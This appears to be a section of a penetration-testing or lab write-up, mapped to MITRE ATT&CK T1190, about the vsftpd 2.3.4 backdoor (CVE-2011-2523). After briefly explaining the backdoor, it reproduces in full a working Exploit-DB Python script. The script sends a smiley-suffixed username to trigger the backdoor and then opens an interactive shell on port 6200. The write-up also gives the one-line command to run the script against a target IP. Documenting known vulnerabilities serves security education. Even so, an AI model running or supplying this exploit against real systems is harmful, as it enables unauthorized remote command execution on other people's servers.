
[Exploit Public-Facing Application - T1190](https://attack.mitre.org/techniques/T1190/)
**vsftpd 2.3.4** is an open-source FTP server used for file transfer in Unix-like operating systems. This is particularly useful for threat actors to enable data exfiltration as this service is designed for file transfer across networks. Searching the service name and version on exploit-db **"vsftp 2.3.4"** reveals that there is a known vulnerability that allows backdoor command execution on machines that use this version of vsftpd. [NIST](https://www.nist.gov/) has created a CVE listing for this vulnerability [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) with the description:
>*"vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp."*

Backdoors are hidden entry points that allow direct unauthorised access into applications, systems and networks. In the case of CVE-2011-2523, the package that was distributed allowed users to login to the server with a **:)** and gain a command shell on port **6200**

The Exploit-db listing also contains a python script which can be used to exploit this vulnerability. 
``` python
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   
                                                           
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
            
```

This python script can be easily ran within the terminal.
``` bash
python3 vsftpd_exploit_db.py <ip>
```
